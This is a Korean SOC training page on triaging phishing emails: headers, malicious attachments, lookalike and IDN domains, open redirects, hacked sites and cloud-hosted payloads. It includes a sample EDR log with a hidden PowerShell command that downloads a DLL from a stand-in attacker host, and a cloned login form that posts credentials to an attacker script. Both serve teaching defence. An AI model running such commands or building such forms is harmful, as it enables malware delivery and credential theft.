# 이메일 공격과 링크 평가하기 — 첨부 파일, 닮은꼴 도메인, 해킹당한 사이트, 믿을 만한 호스팅, 단축 URL { #email-links-phishing }

!!! abstract "이 페이지에서 다루는 것"
    조사의 네 번째 질문 — **이 데이터가 무엇을 말해 주나?** — 를 분석가가 가장 많이 보는 증거, 이메일에 적용합니다. 먼저 이메일로 공격하는 네 가지 방식(악성 첨부 파일 — 실행 파일, 스크립트, 압축 파일과 비밀번호 걸린 압축 파일, 매크로 문서 / 악성 링크 / 아무 페이로드도 없는 순수한 사기 / 드물게 메일 프로그램이나 운영체제의 취약점 공격)과, 어느 경우든 제일 먼저 헤더부터 읽어야 하는 이유. 이어서 피해자가 나쁜 링크를 누르게 만드는 흔한 수법 여덟 가지: 링크 글자와 실제 목적지가 다름, 닮은꼴 도메인(국제화 도메인 이름 포함), 닮은꼴 하위 도메인, 복제한 로그인 페이지, 오픈 리디렉트, "좋은" 사이트의 나쁜 내용, 해킹당한 사이트, 단축 링크. 그중 셋을 깊게: **해킹당한** 사이트와 **처음부터 나쁜 용도로 만든** 사이트를 가르는 법(그림자 하위 도메인, 이상한 폴더, 뚫린 블로그 소프트웨어, 평판과 나이, 과거 스캔 스냅숏, 그리고 차단에 만료일을 다는 이유), 믿을 만한 클라우드 파일 공유 서비스에서 받은 파일이라도 아무것도 증명하지 못하는 이유, **단축 링크**가 어디로 가는지 누르지 않고 보는 법. 어느 아침의 가상 피싱 신고 여섯 건을 페이지 내내 분류합니다. 헤더 줄, HTML `href` 값, Python으로 푸는 퓨니코드, 해킹당한 WordPress 경로, 풀어 본 오픈 리디렉트, 한 줄씩 읽는 `curl -sI` 확인, 클라우드에 올려진 페이로드에 대한 프록시·EDR 증거. 2026년 관점과 확인 문제로 마칩니다.

!!! note "표기"
    **[보충]** = 꼭 알아야 할 실무 보충, **[정정]** = 흔히 잘못 알려진 내용 정정, **[변경됨]**/**[주의]** = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 회사(Bluegum Freight, `bluegumfreight.example`), 사람, 호스트 이름, 도메인, IP, 해시, 헤더, 로그 줄은 모두 설명용 가상 값(`.example`, 문서용·사설 IP)입니다. 도구, 서비스, 프로토콜은 실제이며 제 말로 설명했습니다.

## 한눈에 보는 핵심 8가지 { #key-points }

1. **이메일 공격은 네 가지 모양이다.** 악성 첨부 파일, 악성 링크, 페이로드 없는 사기, 그리고 드물게 메일 프로그램이나 운영체제 취약점 공격. 모양마다 남기는 증거도, 막는 방법도 다르다.
2. **헤더부터 읽는다.** 보낸 사람이 위조됐다면, 무엇을 싣고 왔든 거의 틀림없이 악성이다. 진짜 사람은 자기 주소를 위조할 이유가 없다.
3. **첨부 파일은 평범해 보이거나, 열어 볼 수 없게 만들어서 숨는다.** 매크로 문서는 사람들이 하루 종일 주고받는 문서처럼 생겼다. 압축 파일, 특히 비밀번호 걸린 압축 파일은 메일 필터가 못 열지만, 본문에서 비밀번호를 읽은 사람은 연다.
4. **링크는 파일보다 거르기 어렵다.** 누가 누르기 전까지 링크는 그냥 글자이고, 일괄 금지할 정책도 없고, 배달된 뒤에 목적지를 바꿀 수도 있다. 그래서 링크가 공격자의 단골 메뉴다.
5. **링크 수법 여덟 가지를 알아 둔다.** 글자 ≠ 목적지, 닮은꼴 도메인(IDN 포함), 닮은꼴 하위 도메인, 복제 로그인 페이지, 오픈 리디렉트, 좋은 사이트·나쁜 내용, 해킹당한 사이트, 단축 링크. 피싱 대부분은 이 중 한두 개를 쓴다.
6. **좋은 도메인도 나쁜 페이지를 내줄 수 있다.** 해킹당한 사이트와 그림자 하위 도메인은 깨끗한 평판을 빌려 쓴다. 오랜 이력과 좋은 평판에 이상한 하위 도메인·폴더·리디렉트가 붙어 있으면 "처음부터 나쁨"이 아니라 "해킹당함" 쪽이고, 그러면 차단을 얼마나 오래 둘지가 달라진다.
7. **"믿을 만한 파일 공유 사이트에서 왔다"는 아무것도 증명하지 않는다.** 공격자는 호스트 이름, 포트, 인증서가 다 정상으로 보이게 하려고 클라우드 저장소에 페이로드를 올려 둔다. 진실은 파일 자체와 엔드포인트에 있다.
8. **단축 링크는 목적지에 가지 않고 펼쳐 본다.** 단축 서비스 자체의 미리 보기나 분석용 머신에서 헤더만 받는 요청을 쓰고, 그렇게 알아낸 진짜 목적지를 여느 링크처럼 확인한다.

## SOC에서 왜 중요한가 { #why }

회사 건물 안내 데스크를 떠올려 보세요. 거의 모든 방문객이 거기를 지나가니까, 사기꾼이 한번 찔러보기에도 딱 좋은 곳입니다. 어떤 사람은 수상한 소포를 들고 옵니다(첨부 파일). 어떤 사람은 "나중에 여기 들러 주세요" 하고 주소 적힌 명함을 건넵니다(링크). 어떤 사람은 아무것도 안 들고 와서 말만으로 부탁을 들어주게 만듭니다(사기). 좋은 안내 직원은 소포만 엑스레이로 보는 게 아니라, 명함도 보고, 신분증도 확인하고, 이 사람이 정말 자기가 말하는 그 사람인지 묻습니다.

기술 이야기로 돌아오면, 피싱은 여전히 가장 흔한 침투 경로 중 하나이고, "사용자가 수상한 메일을 신고했어요"는 어느 SOC 대기열에서나 가장 흔한 티켓 중 하나입니다. 대부분은 해가 없습니다. 마케팅 메일, 진짜 동료, 원치 않는 뉴스레터. 그리고 몇 건은 침해의 시작입니다. 이 페이지가 가르치는 건 그 둘을 빠르고 정확하게 가르는 기술입니다. 헤더를 읽고, 공격 방식을 분류하고, 링크를 누르지 않고 뜯어보고, 지금 보는 게 어떤 수법인지 알아보기. 다음 페이지는 대응을 정하는 질문들을 다룹니다. 표적 공격이었나, 누가 눌렀나, 누가 비밀번호를 입력했나, 비즈니스 이메일 침해인가?

## 이메일 기반 공격 방식 { #methods }

### 1. 악성 파일을 바로 첨부하기 { #attachments }

가장 흔한 방식은 여전히 해로운 걸 첨부하는 겁니다. 바뀌는 건 포장이고, 포장마다 이기려는 필터가 다릅니다.

- **실행 파일과 스크립트 형식.** `.exe`, `.scr`, `.js`, `.vbs`, `.hta`, `.ps1`, `.wsf`, `.bat`, `.lnk` 같은 것들. 대부분의 조직은 게이트웨이에서 정책으로 실행 파일을 막으니까, 공격자는 스크립트로 옮겨 갔습니다. Windows가 기꺼이 실행해 주면서도 실행 파일보다 조금 "레이더 밖"에 있는 형식이죠. 다행히 스크립트 확장자도 대개 정책으로 일괄 차단할 수 있습니다. 메일로 스크립트를 보낼 일이 있는 사람은 거의 없으니까요.
- **압축 파일**(`.zip`, `.7z`, `.rar`, 그리고 `.iso`, `.img` 같은 컨테이너 형식). 필터는 안을 검사하려면 먼저 풀어야 하는데, 이게 시간과 처리 자원을 잡아먹습니다. 깊게 겹치거나 특이한 압축 앞에서는 포기하는 장비도 있습니다.
- **비밀번호 걸린 압축 파일.** 가장 영리한 변형입니다. 비밀번호가 메일 본문에 있어야 하죠("비밀번호는 2026입니다"). 사람은 쉽게 읽지만, 자동 필터는 자유롭게 쓴 글 속에서 비밀번호를 찾아 쓰는 걸 잘 못합니다. 장비는 압축을 못 풀고, 메일은 통과되고, 피해자가 직접 페이로드를 꺼냅니다.
- **매크로 문서**(`.docm`, `.xlsm`, 예전 `.doc`/`.xls`). 파일 형식으로 막기 어렵습니다. 사람들이 진짜로 Office 파일을 주고받아야 하니까요. 좋은 스프레드시트와 무기화된 스프레드시트를 가르려면 내용 검사나 샌드박스가 필요한데, 더 복잡하고 비싼 기술입니다.

**예제 — 본문에 적힌 비밀번호.** 첨부 파일 `Remittance_Nov.zip`과 "압축 비밀번호: BG2611"이라는 줄이 있는 신고가 들어왔습니다. 격리된 분석용 머신에서:

```
7z l -pBG2611 Remittance_Nov.zip
```

- `7z` — 7-Zip 명령줄 도구.
- `l` — 아무것도 풀지 않고 내용만 **나열(list)**.
- `-pBG2611` — 비밀번호 지정(`-p`와 비밀번호 사이에 띄어쓰기 없음).
- `Remittance_Nov.zip` — 압축 파일.

출력(줄임):

```
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2026-11-25 21:14:02 ....A       184320        61211  Remittance_Nov.pdf.js
------------------- ----- ------------ ------------  ------------------------
```

파일 하나, `Remittance_Nov.pdf.js` — PDF 이름을 쓴 JavaScript 파일입니다. Windows는 기본적으로 알려진 확장자를 숨기니까, 사용자 눈에는 `Remittance_Nov.pdf`로 보였을 겁니다. 게이트웨이는 이 압축 파일을 "암호화됨, 검사 안 함"으로 기록했습니다. 아무것도 열지 않고도 분석가는 방식(스크립트가 든 비밀번호 압축 파일)을 알았고, 스크립트를 안전하게 살펴보는 동안 보낸 사람, 제목, 첨부 파일 해시로 차단할 수 있습니다([안전한 취급과 파일 형식](../file-analysis/safe-handling-file-types.md) 참고). ATT&CK으로는 T1566.001 Phishing: Spearphishing Attachment, T1027.013 Obfuscated Files or Information: Encrypted/Encoded File, 열었다면 T1204.002 User Execution: Malicious File.

### 2. 악성 링크 { #links }

변치 않는 단골입니다. 링크는 파일보다 자동 검사를 빠져나가기 쉽습니다. 그냥 글자이고, 필터가 확인할 때는 멀쩡하다가 사용자가 누를 때는 해로운 페이지로 바뀔 수 있고, URL이 든 메일을 전부 버리는 간단한 정책 같은 건 없으니까요. 이 페이지의 나머지는 대부분 링크 이야기입니다.

### 3. 사기와 사회 공학 { #scams }

검사할 게 아예 없을 때도 있습니다. 파일도 링크도 없이 말뿐이죠. 보낸 사람은 CEO, 거래처, 변호사인 척하면서 계좌 정보를 바꿔 달라거나, 상품권을 사 달라거나, "급한" 청구서를 처리해 달라고 합니다. 내용 필터가 붙잡을 게 없으니 오히려 가장 잡기 어려운 경우가 많습니다. 다음 페이지에서 다루는 비즈니스 이메일 침해가 가장 비싼 형태입니다.

### 4. 메일 프로그램이나 운영체제 취약점 공격(드묾) { #client-exploits }

아주 가끔, 메일 프로그램이나 운영체제가 어떤 파일 형식을 처리하는 방식의 결함 때문에 평범해 보이는 파일이 공격이 됩니다. 그림이나 일정 초대처럼 아무도 위험하다고 생각하지 않는 것이, 미리 보기나 열기만으로 컴퓨터를 장악할 수 있게 되는 거죠. 잘 알려진 옛 예로, 2013년에 패치된 Windows의 TIFF 그림 처리 결함이 있었습니다. 다른 셋에 비하면 드물지만, 통하는 동안에는 아주 위험합니다. 모든 정책이 허용하는 파일 형식을 무기로 바꾸니까요. **[보충]** 방어는 메일 프로그램, 미리 보기 처리기, 운영체제를 빨리 패치하는 것, 그리고 메일 소프트웨어의 "제로 클릭" 권고를 급한 일로 다루는 것입니다.

### 헤더부터 읽자! { #headers-first }

방식이 무엇이든 헤더로 시작합니다. **위조는 거의 언제나 악성의 표시입니다.** 정상적인 발신자는 주소를 위조할 이유가 없으니까요. 대부분의 질문은 세 줄이 답해 줍니다([이메일 섹션](../email/index.md)에서 하나씩 깊게 설명했습니다).

```
Return-Path: <billing@invoicehub-mailer.example>
From: "Bluegum Freight Accounts" <accounts@bluegumfreight.example>
Authentication-Results: mx.bluegumfreight.example; spf=pass smtp.mailfrom=invoicehub-mailer.example; dkim=none; dmarc=fail action=quarantine header.from=bluegumfreight.example
```

- `Return-Path` — 봉투 발신자(`MAIL FROM`), 반송 메일이 가는 곳. 여기서는 바깥 도메인입니다.
- `From` — 사용자가 보는 것. 우리 회계팀이라고 합니다. 표시 이름도 주소도 내부라고 주장하죠.
- `spf=pass smtp.mailfrom=invoicehub-mailer.example` — SPF가 통과했지만 **바깥 도메인에 대해서**입니다. 우리 도메인이 아니에요. 엉뚱한 도메인의 통과는 `From` 줄을 누가 썼는지에 대해 아무것도 증명하지 않습니다.
- `dkim=none` — 서명 없음.
- `dmarc=fail … header.from=bluegumfreight.example` — `From`의 도메인이 통과한 어떤 확인과도 정렬(alignment)되지 않았습니다. 바깥에서 우리 도메인을 위조하고 있는 겁니다. 반대 증거가 나오기 전까지 악성으로 다룹니다.

| E3 | m.tran(IT) | "메일함 용량 초과" | 로그인 페이지 링크 |

| E5 | s.patel(재무) | "송금 내역" | 클라우드 파일 공유 사이트 링크 |

## 링크 평가하기: 흔한 수법 여덟 가지 { #assessing-links }

| 수법 | 피해자에게 보이는 것 | 실제로 벌어지는 일 | 확인할 것 |
| --- | --- | --- | --- |
| 글자 ≠ 목적지 | 믿음직해 보이는 링크나 버튼 | `href`가 다른 곳을 가리킴 | 글자 말고 HTML 원본의 `href` |
| 닮은꼴 도메인 | "맞아 보이는" 도메인 | 글자 바꿔치기(`m` 대신 `rn`, `l` 대신 `1`)나 유니코드 닮은 글자(IDN) | 도메인을 한 글자씩 읽기, 퓨니코드 풀기 |
| 닮은꼴 하위 도메인 | 호스트 이름 앞쪽에 우리 브랜드 | 우리 브랜드는 공격자 도메인의 *하위 도메인*일 뿐 | 등록된 도메인 찾기(오른쪽에서 왼쪽으로 읽기) |
| 복제 로그인 페이지 | 진짜 로그인 페이지와 똑같은 복사본 | 키트가 페이지를 베꼈고, 폼은 공격자에게 전송 | 주소창의 호스트와 폼이 보내는 곳 |
| 오픈 리디렉트 | 진짜 평판 좋은 사이트의 링크 | 리디렉트 기능이 매개변수 속 아무 URL로나 보냄 | `url=`, `redirect=`, `next=`, `dest=`를 찾아 풀기 |
| 좋은 사이트, 나쁜 내용 | 큰 클라우드 파일 공유·문서 서비스 | 공격자가 자기 계정에 페이로드를 올리고 공유 | 파일 자체, 엔드포인트 텔레메트리, 샌드박스 |
| 해킹당한 사이트 | 평판 좋은 진짜 작은 업체나 블로그 | 서버나 도메인의 DNS가 뚫림 | 이상한 하위 도메인·폴더, CMS 경로, 최근 변경 |
| 단축 링크 | `short.example/Ab3x` | 진짜 목적지가 가려짐 | 안전하게 미리 보기·펼치기 |

### 링크 글자와 실제 목적지가 다름 — E1 { #text-vs-target }

가장 오래된 수법 중 하나인데, 사람들이 누르기 전에 마우스를 올려 보지 않을 때가 있어서 아직도 통합니다. E1의 HTML 원본:

```
<a href="https://payslip-bluegum.example/view?id=88231" style="background:#1a5;color:#fff;padding:10px">View payslip on bluegumfreight.example</a>
```

- `<a href="…">` — **목적지**. 브라우저가 실제로 가는 곳.
- `https://payslip-bluegum.example/…` — 다른 등록 도메인 `payslip-bluegum.example`. 우리 브랜드 이름이 들어 있을 뿐입니다.
- 링크 **글자**("View payslip on bluegumfreight.example")는 초록 버튼 위에 칠한 글씨일 뿐입니다. 아무 말이나 쓸 수 있죠.

저장한 메일에서 링크를 한꺼번에 뽑으려면 분석용 머신에서:

```
grep -oiE 'href="[^"]+"' E1.eml | sort -u
```

- `grep -o` — 줄 전체가 아니라 맞는 부분만 출력. `-i` 대소문자 무시, `-E` 확장 정규 표현식.
- `'href="[^"]+"'` — `href="` 글자, 그다음 따옴표가 아닌 문자 하나 이상, 그리고 닫는 따옴표.
- `E1.eml` — 신고 메일함에서 저장한 메시지(헤더가 남도록 첨부 파일로 전달받은 것).
- `sort -u` — 정렬하고 같은 건 하나만.

출력:

```
href="https://payslip-bluegum.example/view?id=88231"
href="https://www.bluegumfreight.example/privacy"
```

공격자가 진짜 링크(개인정보 처리방침)를 하나 섞어서 메일을 평범해 보이게 했습니다. 흔한 솜씨죠. **[보충]** 본문이 quoted-printable로 인코딩돼 있으면 `href=3D"…"`가 보이고 줄 끝에 `=`가 붙어 줄이 끊깁니다. 링크가 쪼개지지 않도록 MIME 부분을 먼저 풀어 주세요(메일 도구의 "원본 보기"나 Python `email` 파서).

### 닮은꼴 도메인과 IDN — E2 { #lookalike-domains }

E2는 링크 글자와 목적지가 *같습니다*. 그런데도 함정입니다.

```
<a href="https://docs.bluegum-frеight.example/rate-card">https://docs.bluegum-frеight.example/rate-card</a>
```

"bluegum-freight"로 읽히죠. 그런데 "freight"의 두 번째 `е`는 라틴 문자 `e`와 똑같이 생긴 키릴 문자 U+0435입니다. ASCII가 아닌 글자가 들어간 도메인을 **국제화 도메인 이름(IDN, Internationalized Domain Name)** 이라 하고, DNS는 이걸 `xn--`로 시작하는 **퓨니코드(punycode)** 라는 ASCII 형태로 실어 나릅니다. 분석용 머신에서 풀어 봅니다.

```
python3 -c "print('docs.bluegum-frеight.example'.encode('idna'))"
```

- `python3 -c "…"` — Python 한 줄 실행.
- `'…'.encode('idna')` — 호스트 이름을 DNS가 실제로 쓰는 ASCII 형태로 바꿈.

출력:

```
b'docs.xn--bluegum-fright-9vl.example'
```

- `xn--` — 퓨니코드 라벨이라는 표시.
- `bluegum-fright` — 라벨에 있던 ASCII 글자들. ASCII가 아닌 글자는 빠졌습니다(두 번째 `e`가 없는 걸 보세요).
- `-9vl` — 빠진 키릴 문자를 어디에 다시 넣을지 담은 인코딩된 정보.

거꾸로도 됩니다. `python3 -c "print(b'xn--bluegum-fright-9vl'.decode('idna'))"`는 유니코드 형태를 출력합니다. 더 단순한 닮은꼴은 유니코드도 필요 없습니다. `bluegumfrieght.example`(글자 순서 바꿈), `b1uegumfreight.example`(l 대신 1), `bluegumfreight-online.example`(단어 덧붙임), `m`처럼 보이는 `rn`. 도메인을 천천히, 한 글자씩 진짜와 비교해 읽으세요. ATT&CK으로는 이런 도메인을 등록하는 게 T1583.001 Acquire Infrastructure: Domains입니다.

### 닮은꼴 하위 도메인 — E3 { #lookalike-subdomains }

E3의 로그인 링크:

```
https://login.bluegumfreight.example.mailbox-quota.example/owa/auth.html
```

도메인 이름이 어떻게 생겼는지 모르는 사람을 노립니다. 호스트 이름은 **오른쪽에서 왼쪽으로** 읽습니다. 최상위 도메인(`.example`), 그다음 등록된 도메인(`mailbox-quota.example`), 그 앞은 주인이 마음대로 붙인 하위 도메인. `mailbox-quota.example` 왼쪽의 모든 것 — `login.bluegumfreight.example.` — 은 공격자가 자기 영역(zone)에 만든 하위 도메인입니다. 우리 이름이 들어 있지만 우리 회사 소유가 아닙니다. **[보충]** 등록 도메인을 강조해 보여 주는 신고 도구나 브라우저도 있습니다. 티켓을 쓸 때는 등록 도메인을 늘 따로 적으세요("등록 도메인: `mailbox-quota.example`"). 차단하고 조회할 대상이 그거니까요.

### 복제한 로그인 페이지 — E3 이어서 { #cloned-pages }

E3의 페이지는 Bluegum 웹메일 로그인 화면을 픽셀 하나까지 베낀 복사본입니다. 아이디와 비밀번호를 모으는 게 목표일 때, 공격자는 페이지를 몇 분 만에 복사해 올려 주는 도구를 씁니다. 사회 공학 도구 모음을 쓰면 복제는 마법사 화면 따라 누르기 수준의 일이죠. 증거는 페이지 모양에 있지 않습니다. **어디에 올려져 있고, 폼이 데이터를 어디로 보내느냐**에 있습니다.

```
<form method="POST" action="https://mailbox-quota.example/owa/post.php">
  <input type="email" name="u">
  <input type="password" name="p">
```

- `method="POST"` — 브라우저가 입력값을 요청 본문에 담아 보냅니다.
- `action="…/post.php"` — 값은 Bluegum 웹메일이 아니라 공격자 서버의 PHP 스크립트로 갑니다.
- `name="u"` / `name="p"` — 훔친 아이디와 비밀번호가 실려 갈 매개변수 이름. 복호화된 프록시 로그에서 쓸 만한 검색어입니다(다음 페이지).

누가 실제로 폼을 제출했는지 알아내는 법은 다음 페이지에서 봅니다. ATT&CK: 배달은 T1566.002 Phishing: Spearphishing Link, 자격 증명 수집은 T1598.003 Phishing for Information: Spearphishing Link.

### 오픈 리디렉트 — E4 { #open-redirects }

E4의 링크는 진짜, 잘 알려진 협력사에서 시작합니다.

```
https://track.partner-logistics.example/r?dest=https%3A%2F%2Fdelivery-fix.example%2Fpay
```

- `track.partner-logistics.example` — 평판 좋은 진짜 배송 조회 사이트. 필터도 사용자도 믿습니다.
- `/r?dest=` — 리디렉트 기능. 방문자를 `dest`에 든 URL로 보내 줍니다. 사이트가 그 목적지를 확인하지 않으면 누구나 이걸로 피해자를 딴 데로 튕겨 보낼 수 있습니다. 이게 **오픈 리디렉트(open redirect)** 이고, 남의 좋은 이름이 붙은 단축 링크 같은 노릇을 합니다.
- `https%3A%2F%2Fdelivery-fix.example%2Fpay` — URL 인코딩. `%3A`는 `:`, `%2F`는 `/`.

방문하지 않고 풀어 봅니다.

```
python3 -c "import urllib.parse as u; print(u.unquote('https%3A%2F%2Fdelivery-fix.example%2Fpay'))"
```

출력: `https://delivery-fix.example/pay` — 진짜 목적지, 사흘 전에 등록된 도메인입니다. 협력사가 아니라 *이걸* 분석하고 차단하세요. **[보충]** `url=`, `u=`, `redirect=`, `next=`, `goto=`, `dest=`, `continue=` 같은 매개변수를 찾고, 리디렉트가 겹쳐 있거나(리디렉트로 가는 리디렉트) Base64로 인코딩된 경우도 있다는 걸 기억하세요. 우리 메일 보안이 링크를 다시 쓴 것도 알아봐야 합니다. Microsoft Defender 안전한 링크(Safe Links, `safelinks.protection.outlook.com/?url=…`) 같은 것이죠. 진짜 URL은 매개변수 안에 있습니다. 믿을 만한 사이트를 이렇게 악용하는 건 ATT&CK T1608.005 Stage Capabilities: Link Target에서 다룹니다.

## 해킹당한 사이트로 가는 링크 { #hacked-sites }

도메인이 멀쩡해 보이는 건 *정말로* 멀쩡하기 때문일 때가 있습니다. 누가 뚫고 들어가기 전까지는요. 공격자는 사이트가 쌓아 온 좋은 이름에 올라타는 걸 좋아합니다. 인기 있는 웹사이트 소프트웨어(WordPress, Joomla, Drupal과 그 플러그인)의 새 취약점 공격이 공개되면, 공격자는 거의 바로 인터넷에서 취약한 서버를 훑기 시작하고, 뚫은 서버를 피싱 페이지와 악성코드를 올려 두는 곳으로 바꿉니다. 그래서 평판이 *좋은* 사이트에서 오는 다운로드나 공격 시도 경보를 보게 됩니다.

두 번째 길도 있습니다. 공격자가 도메인 관리자를 피싱해서 DNS 등록 업체(registrar)나 호스팅 계정에 들어가면, 자기 서버를 가리키는 하위 도메인 레코드를 몰래 추가할 수 있습니다. 부모 도메인은 깨끗한 이력을 그대로 지닌 채, `invoice.realbusiness.example`이 악성코드를 내줍니다. 이게 **도메인 섀도잉(domain shadowing)** 입니다(ATT&CK T1584.001 Compromise Infrastructure: Domains, 해킹당한 웹 서버는 T1584.004 Compromise Infrastructure: Server).

**평소 좋던 사이트가 해킹당했을 수 있다는 표시:**

- 좋은 부모 도메인의 **이상한 하위 도메인**(섀도잉).
- 다른 건 평범한 도메인 아래의 **수상한 폴더 이름**.
- **자주 뚫리는 블로그나 CMS 소프트웨어**의 경로 — `/wp-content/`, `/wp-includes/`, `/components/`, `/sites/default/files/`.

### 예제: 해킹당했나, 처음부터 나쁜 용도였나? { #hacked-example }

다른 팀 사용자가 어제 이 링크를 열었다고 프록시가 보여 준다고 합시다(다른 피싱 물결에서 온 것입니다).

```
https://www.harbourbakery.example/wp-content/uploads/2026/11/docs/secure/index.php?e=a.nguyen@bluegumfreight.example
```

- `www.harbourbakery.example` — 동네 작은 빵집. 2011년에 등록됐고, 어디서나 평판이 깨끗하고, 몇 년째 같은 단순한 사이트를 운영해 왔습니다.
- `/wp-content/uploads/2026/11/` — WordPress가 2026년 11월 미디어를 넣는 평범한 폴더. 여기엔 그림이 있어야지 PHP 스크립트가 있을 곳이 아닙니다.
- `docs/secure/index.php` — 업로드 폴더에 풀어 놓은 피싱 키트. uploads 밑에 `docs`, `secure`, `office`, `verify` 같은 폴더 이름은 전형적입니다.
- `?e=a.nguyen@…` — 키트가 로그인 칸을 미리 채우도록 피해자 주소를 URL에 넣어 둔 것. 이런 개인 맞춤은 수신자마다 링크를 따로 만들었다는 뜻입니다.

**처음부터 나쁨**이 아니라 **해킹당함**을 가리키는 단서:

- 탄탄한 평판 이력 — 처음부터 나쁜 사이트는 평판 엔진이나 URL 스캐너에서 좋은 점수를 받는 일이 드뭅니다.
- 오래된 도메인 생성일.
- 공격 가능하다고 알려진 낡은 소프트웨어를 돌림.
- 살아 있는 악성 리디렉트나 막 올려진 파일 — 키트 파일에 대한 HTTP 응답의 `Last-Modified` 헤더(또는 디렉터리 목록의 파일 시각)가 지난주인데 사이트 나머지는 몇 년 전이라면.

**처음부터 나쁨**을 가리키는 단서: 며칠 전 등록, 브랜드를 흉내 낸 이름, 이력 없음, 싸거나 개인정보 가림 등록, 거기 올려진 다른 게 아무것도 없음.

**들여다보기 전에 사이트가 청소됐다면.** 이런 일이 생깁니다. 사용자가 감염된 동안 방문했는데, 조사할 즈음 주인이 키트를 지웠습니다. 패킷 캡처나 자세한 프록시 로그가 없다면, 공개 URL 스캔 서비스(urlscan.io 등)에 누군가 감염 상태일 때 스캔한 **과거 스냅숏**이 남아 있을 수 있습니다. 스크린숏, DOM, 리디렉트, 요청한 자원들. 그걸 보면 그 페이지가 무엇을 했고 사용자를 어디로 보냈을지 알 수 있으니, 우리 사용자의 트래픽이 거기에 맞는지 확인할 수 있습니다.

**해킹당한 사이트 차단하기.** 처음부터 나쁜 사이트는 영원히 막아도 됩니다. 해킹당한 사이트는 피해자입니다. 청소되고 나면 사람들이 정당하게 다시 써야 할 수도 있죠. 잘 모르는 작은 사이트라면 영구 차단도 대개 괜찮지만, 큰 이름의 사이트가 감염되면 *당분간만* 막아야 합니다. 도구가 허락하면 차단에 **만료일**을 달거나, 티켓에 다시 확인할 알림을 남기세요. **[보충]** 가능한 좁게 막으세요. 도메인 전체보다 정확한 경로나 하위 도메인을. 그리고 주인(이나 호스팅 업체)에게 알려 청소하게 하는 것도 고려하세요. 조사를 드러내지 않고 그렇게 하는 법은 뒤의 분석 OPSEC 섹션에서 다룹니다.

## 나쁜 다운로드를 올려 둔 "안전한" 사이트로 가는 링크 — E5 { #trusted-hosting }

큰 클라우드 파일 공유 서비스에서 받았다고 좋은 파일이라는 뜻은 아닙니다. 패턴은 단순합니다.

1. **악성코드를 올려 둔다.** 공격자가 매크로 문서, 스크립트, 실행 파일을 자기 계정 — 때로는 다른 회사의 *뚫린* 계정 — 의 폴더에 올리고, 링크만 있으면 누구나 받을 수 있게 공개 공유합니다(T1608.001 Stage Capabilities: Upload Malware).
2. **피싱 링크를 보낸다.** 늘 하던 미끼에, 믿을 만한 서비스를 가리키는 링크.
3. **사용자가 내려받는다.**

공격자가 이걸 좋아하는 이유는 둘입니다. 잘 알려진 파일 공유 서비스로 가는 트래픽은 훨씬 덜 의심받습니다. 그리고 그런 서비스는 TLS로 암호화돼 있고, 무료이고, 쉬워서 공격자의 준비 비용이 거의 0입니다. 호스트 이름 확인은 통과하고, 인증서는 유효하고, 조직이 TLS를 복호화하지 않는다면 네트워크에는 "사용자가 인기 있는 파일 공유 서비스에 접속함"만 보입니다. 파일은 다른 방법으로 잡아야 합니다. 엔드포인트 통제(EDR, 백신, 프로세스 감시), 또는 메일 클릭에서 시작된 다운로드를 터뜨려 보는 샌드박스 장비.

E5의 링크: `https://share.cloudfiles.example/s/q8Hk2/Remittance-2611.zip`. Bluegum은 파일 공유 서비스로 가는 트래픽을 복호화하니까 프록시에 이렇게 남았습니다.

```
2026-11-27T07:42:18Z  src=10.20.6.41  user=BLUEGUM\s.patel  method=GET  host=share.cloudfiles.example  url=/s/q8Hk2/Remittance-2611.zip  status=200  ctype=application/zip  bytes_in=48211  category=File Sharing  action=allowed
```

- `user=BLUEGUM\s.patel` — 신고한 사람이 먼저 눌렀습니다. 흔한 일이에요. 뭔가 이상하다고 느낀 *뒤에* 신고하니까요.
- `host=share.cloudfiles.example`, `category=File Sharing`, `action=allowed` — 평판과 분류 확인을 모두 통과.
- `ctype=application/zip`, `bytes_in=48211` — 47 KB짜리 압축 파일이 도착. 스크립트 로더가 보통 그렇듯 작습니다.

네트워크 데이터는 여기까지입니다. 다운로드가 있었다는 건 증명하지만, 파일이 나쁜지는 아닙니다. 나머지는 엔드포인트가 답합니다. BG-WS-0641의 EDR:

```
07:42:55  explorer.exe → wscript.exe  "C:\Users\s.patel\Downloads\Remittance-2611\Remittance-2611.js"
07:42:56  wscript.exe → powershell.exe  -nop -w hidden -ep bypass -c "iwr https://cdn-sync.example/u.png -OutFile $env:TEMP\u.dll"
```

- `explorer.exe → wscript.exe … .js` — 사용자가 압축에서 꺼낸 JavaScript 파일을 더블클릭했고, Windows Script Host가 실행했습니다(T1204.002, T1059.007 JavaScript).
- `wscript.exe → powershell.exe` — 스크립트 호스트가 PowerShell을 띄우는 일은 정상인 경우가 드뭅니다.
- `-nop -w hidden -ep bypass` — 프로필 안 읽음, 창 숨김, 실행 정책 무시.
- `iwr … u.png -OutFile … u.dll` — `Invoke-WebRequest`로 "PNG"를 받아 DLL로 저장(T1105 Ingress Tool Transfer).

Windows에서 짝이 되는 호스트 로그는 **보안 이벤트 4688**(새 프로세스가 만들어짐)입니다. 프로세스 생성 감사가 켜져 있으면 프로세스가 시작될 때마다 생기고, 명령줄 기록까지 켜 두면 위의 `powershell.exe` 명령 전체가 남습니다. 공격자가 신경 쓰는 이유는, 바로 이 기록이 자기 다운로드 크래들(cradle)을 드러내기 때문입니다. 그래서 새 프로세스 없이 실행하거나 로그를 지우려 하죠. **PowerShell 스크립트 블록 로깅**이 켜져 있으면 PowerShell Operational 로그의 **이벤트 4104**에 스크립트 내용 자체가 남습니다. 이제 이건 사고입니다. 호스트를 격리하고, `cdn-sync.example`을 막고, 공유된 파일을 파일 공유 업체에 신고합니다([피싱 배달과 초기 실행](../../../adversary/phishing-delivery.md) 참고).

## 그 단축 링크는 무엇을 숨기고 있나? — E6 { #shortened-links }

E6에는 `https://lnk.example/Pq7Rz`가 들어 있습니다. 공격자는 링크가 진짜 어디로 가는지 숨기려고, 그리고 배달 뒤에 목적지를 바꾸려고 단축 서비스를 씁니다. 분석가의 일은 **목적지를 방문하지 않고** 진짜 URL을 알아내는 겁니다.

**방법 1: 단축 서비스 자체의 미리 보기.** 많은 단축 서비스가 목적지로 가는 대신 목적지를 보여 주는 기능을 갖고 있습니다.

| 단축 서비스 | 미리 보기 방법 | 비고 |
| --- | --- | --- |
| Bitly(`bit.ly`) | 끝에 `+` 붙이기: `bit.ly/<코드>+` | 지금도 목적지를 보여 줌. 공개 클릭 수는 더는 안 보임 |
